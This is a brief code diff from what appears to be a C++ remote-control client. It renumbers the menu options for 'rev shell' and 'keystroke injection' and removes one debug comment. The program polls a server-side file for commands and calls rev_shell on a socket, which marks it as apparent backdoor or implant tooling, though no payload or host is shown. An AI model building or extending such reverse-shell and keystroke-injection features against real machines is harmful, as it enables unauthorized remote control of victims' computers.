@@ -52,16 +52,15 @@ int main()
                 cout << "option: " << option << endl;
                 switch (option)
                 {
-                    case '2':                                                                                     //rev shell
+                    case '3':                                                                                     //rev shell
                     {
                         send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
-                        //cout << "mark the file read [switch] inside case 2" << endl;
                         
                         rev_shell(sock);
                         break;
                     }
 
-                    case '3':                                                                                     //keystroke injection
+                    case '4':                                                                                     //keystroke injection
                     {
                         
                         if(receive_data(sock,"from_server.txt")[0] == '`')
